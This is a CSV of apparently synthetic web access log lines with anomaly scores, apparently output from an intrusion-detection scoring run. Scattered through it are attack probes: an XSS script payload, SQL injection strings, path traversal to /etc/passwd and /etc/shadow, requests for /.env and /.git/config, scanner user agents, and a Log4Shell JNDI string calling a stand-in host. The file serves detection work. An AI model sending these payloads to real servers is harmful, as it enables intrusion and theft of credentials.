score_content,score_session,score_fused,score_fused_norm,line
11064.4990234375,,11064.4990234375,11064.4990234375,198.90.213.68 - - [10/Jan/2025:12:39:41 +0000] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 500 557 "https://example.com/" "python-requests/2.31.0"
127.0224380493164,,127.0224380493164,127.0224380493164,85.107.155.70 - - [10/Jan/2025:12:39:43 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 290 "https://www.google.com/" "python-requests/2.31.0"
0.27089306712150574,,0.27089306712150574,0.27089306712150574,7.137.133.188 - - [10/Jan/2025:12:39:43 +0000] "GET /assets/app.css HTTP/1.1" 200 18839 "https://news.ycombinator.com/" "python-requests/2.31.0"
13.515326499938965,,13.515326499938965,13.515326499938965,176.9.120.67 - - [10/Jan/2025:12:39:44 +0000] "PUT /login HTTP/1.1" 200 18811 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
27.28276252746582,,27.28276252746582,27.28276252746582,233.97.142.8 - - [10/Jan/2025:12:39:47 +0000] "POST /search?q=laptop HTTP/1.1" 200 16781 "-" "sqlmap/1.7.2#stable"
127.12812805175781,,127.12812805175781,127.12812805175781,177.101.114.121 - - [10/Jan/2025:12:39:47 +0000] "TRACE /search?q=camera HTTP/1.1" 200 791 "-" "dirb/2.22"
50.060020446777344,,50.060020446777344,50.060020446777344,223.220.78.179 - - [10/Jan/2025:12:39:47 +0000] "DELETE /search?q=camera HTTP/1.1" 200 3641 "https://news.ycombinator.com/" "dirb/2.22"
104.80886840820312,,104.80886840820312,104.80886840820312,78.177.228.191 - - [10/Jan/2025:12:39:48 +0000] "TRACE /about HTTP/1.1" 200 6308 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30251.517578125,,30251.517578125,30251.517578125,19.63.87.105 - - [10/Jan/2025:12:39:51 +0000] "TRACE /api/product?id=123 HTTP/1.1" 403 1059 "https://www.google.com/" "sqlmap/1.7.2#stable"
35.823238372802734,,35.823238372802734,35.823238372802734,181.115.49.176 - - [10/Jan/2025:12:39:52 +0000] "PUT /search?q=laptop HTTP/1.1" 200 10836 "-" "nikto/2.5.0"
0.20900817215442657,,0.20900817215442657,0.20900817215442657,250.164.19.93 - - [10/Jan/2025:12:39:53 +0000] "GET /assets/app.css HTTP/1.1" 204 5057 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
27.280445098876953,,27.280445098876953,27.280445098876953,69.25.237.188 - - [10/Jan/2025:12:39:54 +0000] "POST /search?q=phone HTTP/1.1" 200 9929 "https://news.ycombinator.com/" "nikto/2.5.0"
35.8709602355957,,35.8709602355957,35.8709602355957,42.239.237.220 - - [10/Jan/2025:12:39:56 +0000] "PUT /search?q=phone HTTP/1.1" 200 17625 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
27.64715576171875,,27.64715576171875,27.64715576171875,150.42.133.115 - - [10/Jan/2025:12:39:59 +0000] "DELETE /profile HTTP/1.1" 200 770 "-" "dirb/2.22"
107.63699340820312,,107.63699340820312,107.63699340820312,140.94.247.90 - - [10/Jan/2025:12:40:02 +0000] "TRACE /contact HTTP/1.1" 302 14113 "https://www.google.com/" "curl/7.85.0"
24.275026321411133,,24.275026321411133,24.275026321411133,205.120.165.112 - - [10/Jan/2025:12:40:04 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10920 "-" "dirb/2.22"
47.65994644165039,,47.65994644165039,47.65994644165039,66.96.158.253 - - [10/Jan/2025:12:40:06 +0000] "HEAD /profile HTTP/1.1" 200 9524 "https://news.ycombinator.com/" "nikto/2.5.0"
11.517121315002441,,11.517121315002441,11.517121315002441,72.139.249.75 - - [10/Jan/2025:12:40:07 +0000] "PUT /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 12880 "https://example.com/" "nikto/2.5.0"
70.05577850341797,,70.05577850341797,70.05577850341797,115.226.120.251 - - [10/Jan/2025:12:40:09 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1881 "https://news.ycombinator.com/" "dirb/2.22"
24.42339515686035,,24.42339515686035,24.42339515686035,85.218.1.39 - - [10/Jan/2025:12:40:10 +0000] "GET /search?q=phone HTTP/1.1" 200 9052 "https://www.google.com/" "nikto/2.5.0"
30124.818359375,,30124.818359375,30124.818359375,2.208.169.92 - - [10/Jan/2025:12:40:12 +0000] "GET /assets/app.css HTTP/1.1" 403 567 "https://twitter.com/" "dirb/2.22"
76.14848327636719,,76.14848327636719,76.14848327636719,116.172.70.97 - - [10/Jan/2025:12:40:13 +0000] "OPTIONS /api/products HTTP/1.1" 301 12974 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30174.279296875,,30174.279296875,30174.279296875,20.175.82.188 - - [10/Jan/2025:12:40:16 +0000] "DELETE /search?q=router HTTP/1.1" 400 835 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
95.77953338623047,,95.77953338623047,95.77953338623047,8.218.26.46 - - [10/Jan/2025:12:40:17 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 6495 "-" "nikto/2.5.0"
47.72785949707031,,47.72785949707031,47.72785949707031,96.137.167.162 - - [10/Jan/2025:12:40:20 +0000] "HEAD /logout HTTP/1.1" 200 18006 "https://news.ycombinator.com/" "dirb/2.22"
0.209075927734375,,0.209075927734375,0.209075927734375,50.210.171.232 - - [10/Jan/2025:12:40:21 +0000] "GET /assets/app.css HTTP/1.1" 201 4189 "https://www.google.com/" "curl/7.85.0"
7.608449935913086,,7.608449935913086,7.608449935913086,132.121.158.201 - - [10/Jan/2025:12:40:22 +0000] "POST /phpmyadmin HTTP/1.1" 301 10435 "https://www.google.com/" "nikto/2.5.0"
0.3245367705821991,,0.3245367705821991,0.3245367705821991,54.172.37.163 - - [10/Jan/2025:12:40:24 +0000] "GET /.git/config HTTP/1.1" 200 11356 "https://twitter.com/" "nikto/2.5.0"
47.71523666381836,,47.71523666381836,47.71523666381836,132.192.125.121 - - [10/Jan/2025:12:40:27 +0000] "HEAD /about HTTP/1.1" 200 5428 "-" "curl/7.85.0"
6.049670219421387,,6.049670219421387,6.049670219421387,114.54.11.246 - - [10/Jan/2025:12:40:30 +0000] "POST /wp-login.php HTTP/1.1" 302 18168 "-" "nikto/2.5.0"
95.74612426757812,,95.74612426757812,95.74612426757812,49.161.107.252 - - [10/Jan/2025:12:40:31 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 6240 "-" "Wget/1.21.2 (linux-gnu)"
27.706981658935547,,27.706981658935547,27.706981658935547,193.54.234.227 - - [10/Jan/2025:12:40:31 +0000] "DELETE /contact HTTP/1.1" 200 17146 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
24.395008087158203,,24.395008087158203,24.395008087158203,85.131.81.118 - - [10/Jan/2025:12:40:34 +0000] "GET /search?q=router HTTP/1.1" 200 7916 "https://twitter.com/" "nikto/2.5.0"
2.283353567123413,,2.283353567123413,2.283353567123413,179.170.134.10 - - [10/Jan/2025:12:40:36 +0000] "GET / HTTP/1.1" 200 8840 "https://www.google.com/" "curl/7.85.0"
50.675235748291016,,50.675235748291016,50.675235748291016,10.126.172.171 - - [10/Jan/2025:12:40:39 +0000] "HEAD /login HTTP/1.1" 304 16730 "https://twitter.com/" "python-requests/2.31.0"
27.287843704223633,,27.287843704223633,27.287843704223633,43.70.216.57 - - [10/Jan/2025:12:40:42 +0000] "GET /search?q=laptop HTTP/1.1" 301 18349 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.294588088989258,,2.294588088989258,2.294588088989258,96.117.112.145 - - [10/Jan/2025:12:40:45 +0000] "GET / HTTP/1.1" 200 11495 "https://twitter.com/" "curl/7.85.0"
71.60844421386719,,71.60844421386719,71.60844421386719,157.193.223.42 - - [10/Jan/2025:12:40:48 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 3549 "https://www.google.com/" "curl/7.85.0"
30124.9609375,,30124.9609375,30124.9609375,5.148.59.211 - - [10/Jan/2025:12:40:49 +0000] "GET /index.html HTTP/1.1" 404 1013 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
104.78398895263672,,104.78398895263672,104.78398895263672,66.20.223.55 - - [10/Jan/2025:12:40:51 +0000] "TRACE /profile HTTP/1.1" 200 19212 "-" "nikto/2.5.0"
30229.21875,,30229.21875,30229.21875,13.23.13.210 - - [10/Jan/2025:12:40:52 +0000] "TRACE /contact HTTP/1.1" 400 1423 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
16.226112365722656,,16.226112365722656,16.226112365722656,9.88.6.175 - - [10/Jan/2025:12:40:54 +0000] "PUT /api/products HTTP/1.1" 302 11771 "https://example.com/" "nikto/2.5.0"
76.31153106689453,,76.31153106689453,76.31153106689453,216.176.97.202 - - [10/Jan/2025:12:40:56 +0000] "OPTIONS /login HTTP/1.1" 302 13301 "https://news.ycombinator.com/" "dirb/2.22"
35.78742980957031,,35.78742980957031,35.78742980957031,190.141.102.110 - - [10/Jan/2025:12:40:59 +0000] "PUT /search?q=camera HTTP/1.1" 200 3486 "https://example.com/" "dirb/2.22"
71.67225646972656,,71.67225646972656,71.67225646972656,180.88.153.22 - - [10/Jan/2025:12:41:00 +0000] "OPTIONS /.git/config HTTP/1.1" 200 10868 "https://example.com/" "curl/7.85.0"
4.96684455871582,,4.96684455871582,4.96684455871582,3.79.118.189 - - [10/Jan/2025:12:41:02 +0000] "GET /admin HTTP/1.1" 304 5277 "https://www.google.com/" "dirb/2.22"
24.433500289916992,,24.433500289916992,24.433500289916992,27.72.26.194 - - [10/Jan/2025:12:41:02 +0000] "GET /search?q=phone HTTP/1.1" 200 11453 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.18885764479637146,,0.18885764479637146,0.18885764479637146,194.213.55.215 - - [10/Jan/2025:12:41:04 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8685 "https://twitter.com/" "nikto/2.5.0"
95.7193374633789,,95.7193374633789,95.7193374633789,183.240.48.102 - - [10/Jan/2025:12:41:06 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5237 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.120822906494141,,5.120822906494141,5.120822906494141,163.239.73.50 - - [10/Jan/2025:12:41:08 +0000] "GET / HTTP/1.1" 301 4684 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30172.21875,,30172.21875,30172.21875,70.46.186.162 - - [10/Jan/2025:12:41:08 +0000] "HEAD /dashboard HTTP/1.1" 403 182 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.480435371398926,,13.480435371398926,13.480435371398926,236.113.188.66 - - [10/Jan/2025:12:41:08 +0000] "PUT /login HTTP/1.1" 200 9239 "https://example.com/" "python-requests/2.31.0"
50.14237976074219,,50.14237976074219,50.14237976074219,124.9.251.56 - - [10/Jan/2025:12:41:10 +0000] "DELETE /search?q=phone HTTP/1.1" 200 17416 "https://twitter.com/" "dirb/2.22"
0.5248124599456787,,0.5248124599456787,0.5248124599456787,116.155.82.84 - - [10/Jan/2025:12:41:10 +0000] "GET /.env HTTP/1.1" 200 1808 "https://news.ycombinator.com/" "curl/7.85.0"
30138.0,,30138.0,30138.0,5.199.157.186 - - [10/Jan/2025:12:41:13 +0000] "PUT /logout HTTP/1.1" 401 121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.822546005249023,,4.822546005249023,4.822546005249023,247.231.231.231 - - [10/Jan/2025:12:41:16 +0000] "POST /contact HTTP/1.1" 200 4817 "https://news.ycombinator.com/" "nikto/2.5.0"
30151.59375,,30151.59375,30151.59375,199.113.143.28 - - [10/Jan/2025:12:41:19 +0000] "POST /search?q=camera HTTP/1.1" 404 671 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
27.678443908691406,,27.678443908691406,27.678443908691406,105.27.64.41 - - [10/Jan/2025:12:41:21 +0000] "DELETE /logout HTTP/1.1" 200 1997 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
73.37747192382812,,73.37747192382812,73.37747192382812,243.240.35.2 - - [10/Jan/2025:12:41:23 +0000] "OPTIONS /profile HTTP/1.1" 200 16887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.219797372817993,,3.219797372817993,3.219797372817993,149.138.15.105 - - [10/Jan/2025:12:41:23 +0000] "GET /index.html HTTP/1.1" 301 13077 "https://twitter.com/" "dirb/2.22"
73.38355255126953,,73.38355255126953,73.38355255126953,52.133.216.14 - - [10/Jan/2025:12:41:25 +0000] "OPTIONS /contact HTTP/1.1" 200 18820 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.97988891601562,,69.97988891601562,69.97988891601562,98.78.116.199 - - [10/Jan/2025:12:41:27 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 6308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.784593105316162,,4.784593105316162,4.784593105316162,126.48.137.142 - - [10/Jan/2025:12:41:29 +0000] "POST /api/products HTTP/1.1" 200 10949 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2849171459674835,,0.2849171459674835,0.2849171459674835,34.214.25.202 - - [10/Jan/2025:12:41:31 +0000] "GET /.git/config HTTP/1.1" 200 827 "https://twitter.com/" "dirb/2.22"
95.7052993774414,,95.7052993774414,95.7052993774414,214.95.26.13 - - [10/Jan/2025:12:41:32 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 14444 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.844234466552734,,35.844234466552734,35.844234466552734,214.43.247.64 - - [10/Jan/2025:12:41:35 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 8319 "-" "Wget/1.21.2 (linux-gnu)"
107.56830596923828,,107.56830596923828,107.56830596923828,46.184.36.130 - - [10/Jan/2025:12:41:36 +0000] "TRACE /profile HTTP/1.1" 301 3339 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30126.611328125,,30126.611328125,30126.611328125,195.13.152.252 - - [10/Jan/2025:12:41:38 +0000] "GET /admin HTTP/1.1" 401 105 "https://example.com/" "curl/7.85.0"
27.249481201171875,,27.249481201171875,27.249481201171875,76.220.127.163 - - [10/Jan/2025:12:41:38 +0000] "POST /search?q=camera HTTP/1.1" 200 8188 "-" "sqlmap/1.7.2#stable"
5.1719841957092285,,5.1719841957092285,5.1719841957092285,175.144.39.24 - - [10/Jan/2025:12:41:39 +0000] "GET / HTTP/1.1" 301 16875 "https://twitter.com/" "curl/7.85.0"
2.2655935287475586,,2.2655935287475586,2.2655935287475586,8.128.34.219 - - [10/Jan/2025:12:41:41 +0000] "GET / HTTP/1.1" 200 5210 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
13.342606544494629,,13.342606544494629,13.342606544494629,83.58.66.62 - - [10/Jan/2025:12:41:42 +0000] "PUT /api/products HTTP/1.1" 200 10205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.81096649169922,,95.81096649169922,95.81096649169922,25.8.118.218 - - [10/Jan/2025:12:41:42 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 201 2551 "https://twitter.com/" "python-requests/2.31.0"
30138.080078125,,30138.080078125,30138.080078125,11.244.226.166 - - [10/Jan/2025:12:41:42 +0000] "PUT /login HTTP/1.1" 404 1104 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.79848861694336,,35.79848861694336,35.79848861694336,178.61.252.41 - - [10/Jan/2025:12:41:45 +0000] "PUT /search?q=monitor HTTP/1.1" 200 10067 "https://twitter.com/" "nikto/2.5.0"
71.56698608398438,,71.56698608398438,71.56698608398438,179.76.69.187 - - [10/Jan/2025:12:41:48 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 16145 "https://www.google.com/" "python-requests/2.31.0"
27.29132080078125,,27.29132080078125,27.29132080078125,77.38.191.155 - - [10/Jan/2025:12:41:50 +0000] "POST /search?q=phone HTTP/1.1" 200 12621 "https://news.ycombinator.com/" "dirb/2.22"
35.78901290893555,,35.78901290893555,35.78901290893555,200.67.126.125 - - [10/Jan/2025:12:41:53 +0000] "PUT /search?q=monitor HTTP/1.1" 200 7958 "-" "python-requests/2.31.0"
76.18305206298828,,76.18305206298828,76.18305206298828,190.81.111.199 - - [10/Jan/2025:12:41:53 +0000] "OPTIONS /dashboard HTTP/1.1" 304 7364 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
130.18499755859375,,130.18499755859375,130.18499755859375,126.80.241.11 - - [10/Jan/2025:12:41:55 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 19557 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
1.8257781267166138,,1.8257781267166138,1.8257781267166138,3.42.151.189 - - [10/Jan/2025:12:41:58 +0000] "GET /server-status HTTP/1.1" 200 13463 "https://www.google.com/" "nikto/2.5.0"
24.38812255859375,,24.38812255859375,24.38812255859375,181.25.47.7 - - [10/Jan/2025:12:41:58 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1918 "-" "dirb/2.22"
45.8162956237793,,45.8162956237793,45.8162956237793,35.193.224.160 - - [10/Jan/2025:12:41:59 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 1714 "https://www.google.com/" "sqlmap/1.7.2#stable"
73.44430541992188,,73.44430541992188,73.44430541992188,228.147.164.164 - - [10/Jan/2025:12:41:59 +0000] "OPTIONS /login HTTP/1.1" 200 14469 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.3074722290039,,73.3074722290039,73.3074722290039,30.218.44.213 - - [10/Jan/2025:12:42:02 +0000] "OPTIONS /dashboard HTTP/1.1" 200 16382 "https://example.com/" "nikto/2.5.0"
13.310723304748535,,13.310723304748535,13.310723304748535,214.140.40.179 - - [10/Jan/2025:12:42:05 +0000] "PUT /phpmyadmin HTTP/1.1" 200 10446 "https://twitter.com/" "nikto/2.5.0"
0.3589252829551697,,0.3589252829551697,0.3589252829551697,254.125.252.209 - - [10/Jan/2025:12:42:07 +0000] "GET /index.html HTTP/1.1" 200 12502 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.3226888179779053,,2.3226888179779053,2.3226888179779053,211.19.63.95 - - [10/Jan/2025:12:42:10 +0000] "GET / HTTP/1.1" 200 19715 "https://example.com/" "dirb/2.22"
27.701915740966797,,27.701915740966797,27.701915740966797,241.246.27.212 - - [10/Jan/2025:12:42:10 +0000] "DELETE /contact HTTP/1.1" 200 15617 "-" "Wget/1.21.2 (linux-gnu)"
2.294464349746704,,2.294464349746704,2.294464349746704,2.160.226.40 - - [10/Jan/2025:12:42:12 +0000] "GET / HTTP/1.1" 200 11464 "https://news.ycombinator.com/" "dirb/2.22"
50.461509704589844,,50.461509704589844,50.461509704589844,231.66.213.202 - - [10/Jan/2025:12:42:14 +0000] "HEAD /api/products HTTP/1.1" 302 8538 "-" "Wget/1.21.2 (linux-gnu)"
0.16422046720981598,,0.16422046720981598,0.16422046720981598,59.104.84.213 - - [10/Jan/2025:12:42:16 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 3782 "https://www.google.com/" "dirb/2.22"
25.811246871948242,,25.811246871948242,25.811246871948242,49.233.63.116 - - [10/Jan/2025:12:42:19 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17896 "https://www.google.com/" "nikto/2.5.0"
0.28308361768722534,,0.28308361768722534,0.28308361768722534,144.174.133.112 - - [10/Jan/2025:12:42:22 +0000] "GET /assets/app.js HTTP/1.1" 200 14933 "-" "python-requests/2.31.0"
24.3511962890625,,24.3511962890625,24.3511962890625,79.128.12.136 - - [10/Jan/2025:12:42:25 +0000] "GET /search?q=monitor HTTP/1.1" 200 3549 "-" "nikto/2.5.0"
50.11589431762695,,50.11589431762695,50.11589431762695,81.178.188.224 - - [10/Jan/2025:12:42:28 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 16413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30129.220703125,,30129.220703125,30129.220703125,89.11.43.247 - - [10/Jan/2025:12:42:30 +0000] "POST /api/products HTTP/1.1" 400 552 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
25.810253143310547,,25.810253143310547,25.810253143310547,29.239.205.242 - - [10/Jan/2025:12:42:30 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17581 "https://www.google.com/" "curl/7.85.0"
104.7940444946289,,104.7940444946289,104.7940444946289,140.55.169.105 - - [10/Jan/2025:12:42:31 +0000] "TRACE /about HTTP/1.1" 200 708 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0384790897369385,,2.0384790897369385,2.0384790897369385,145.231.68.22 - - [10/Jan/2025:12:42:32 +0000] "GET /admin HTTP/1.1" 200 779 "https://www.google.com/" "python-requests/2.31.0"
0.20309947431087494,,0.20309947431087494,0.20309947431087494,42.195.11.194 - - [10/Jan/2025:12:42:35 +0000] "GET /assets/app.css HTTP/1.1" 200 2614 "https://twitter.com/" "sqlmap/1.7.2#stable"
13.382933616638184,,13.382933616638184,13.382933616638184,112.181.100.60 - - [10/Jan/2025:12:42:36 +0000] "PUT /profile HTTP/1.1" 200 4661 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
130.04959106445312,,130.04959106445312,130.04959106445312,68.173.215.151 - - [10/Jan/2025:12:42:38 +0000] "TRACE /search?q=phone HTTP/1.1" 301 12410 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.243715286254883,,27.243715286254883,27.243715286254883,6.113.32.11 - - [10/Jan/2025:12:42:40 +0000] "POST /search?q=laptop HTTP/1.1" 200 6983 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.2929067611694336,,2.2929067611694336,2.2929067611694336,85.174.231.199 - - [10/Jan/2025:12:42:40 +0000] "GET / HTTP/1.1" 200 11077 "https://www.google.com/" "curl/7.85.0"
24.4561767578125,,24.4561767578125,24.4561767578125,16.180.57.156 - - [10/Jan/2025:12:42:43 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 18030 "https://www.google.com/" "python-requests/2.31.0"
2.252453327178955,,2.252453327178955,2.252453327178955,224.128.153.3 - - [10/Jan/2025:12:42:44 +0000] "GET / HTTP/1.1" 200 951 "-" "curl/7.85.0"
70.08209991455078,,70.08209991455078,70.08209991455078,108.135.76.51 - - [10/Jan/2025:12:42:45 +0000] "HEAD /search?q=router HTTP/1.1" 200 12132 "https://twitter.com/" "dirb/2.22"
50.620567321777344,,50.620567321777344,50.620567321777344,103.175.220.181 - - [10/Jan/2025:12:42:45 +0000] "HEAD /login HTTP/1.1" 302 12585 "https://www.google.com/" "python-requests/2.31.0"
3.2032766342163086,,3.2032766342163086,3.2032766342163086,249.48.109.77 - - [10/Jan/2025:12:42:47 +0000] "GET /index.html HTTP/1.1" 302 5013 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11072.9384765625,,11072.9384765625,11072.9384765625,202.234.67.100 - - [10/Jan/2025:12:42:48 +0000] "PUT /search?q=headphones HTTP/1.1" 502 306 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30152.279296875,,30152.279296875,30152.279296875,242.30.146.231 - - [10/Jan/2025:12:42:50 +0000] "DELETE /dashboard HTTP/1.1" 403 87 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.303347587585449,,2.303347587585449,2.303347587585449,103.74.123.253 - - [10/Jan/2025:12:42:52 +0000] "GET / HTTP/1.1" 200 13799 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.076472759246826,,2.076472759246826,2.076472759246826,232.79.29.194 - - [10/Jan/2025:12:42:52 +0000] "GET /login HTTP/1.1" 204 12899 "https://twitter.com/" "nikto/2.5.0"
71.63510131835938,,71.63510131835938,71.63510131835938,147.198.104.64 - - [10/Jan/2025:12:42:53 +0000] "OPTIONS /.git/config HTTP/1.1" 200 3230 "https://example.com/" "python-requests/2.31.0"
27.66785430908203,,27.66785430908203,27.66785430908203,74.69.106.89 - - [10/Jan/2025:12:42:56 +0000] "DELETE /contact HTTP/1.1" 204 8647 "https://www.google.com/" "sqlmap/1.7.2#stable"
103.07984161376953,,103.07984161376953,103.07984161376953,193.142.8.131 - - [10/Jan/2025:12:42:58 +0000] "TRACE /.git/config HTTP/1.1" 200 13429 "https://example.com/" "nikto/2.5.0"
30138.037109375,,30138.037109375,30138.037109375,194.111.26.143 - - [10/Jan/2025:12:43:01 +0000] "PUT /login HTTP/1.1" 403 1119 "-" "python-requests/2.31.0"
27.310930252075195,,27.310930252075195,27.310930252075195,159.83.223.8 - - [10/Jan/2025:12:43:03 +0000] "GET /api/product?id=123 HTTP/1.1" 304 1474 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
70.05767822265625,,70.05767822265625,70.05767822265625,153.84.163.205 - - [10/Jan/2025:12:43:03 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2200 "-" "curl/7.85.0"
0.36711493134498596,,0.36711493134498596,0.36711493134498596,139.238.144.94 - - [10/Jan/2025:12:43:05 +0000] "GET /index.html HTTP/1.1" 200 14746 "https://news.ycombinator.com/" "curl/7.85.0"
27.457927703857422,,27.457927703857422,27.457927703857422,185.243.223.239 - - [10/Jan/2025:12:43:05 +0000] "DELETE /server-status HTTP/1.1" 200 2280 "https://example.com/" "nikto/2.5.0"
30137.95703125,,30137.95703125,30137.95703125,245.129.43.208 - - [10/Jan/2025:12:43:08 +0000] "PUT /admin HTTP/1.1" 401 1440 "-" "dirb/2.22"
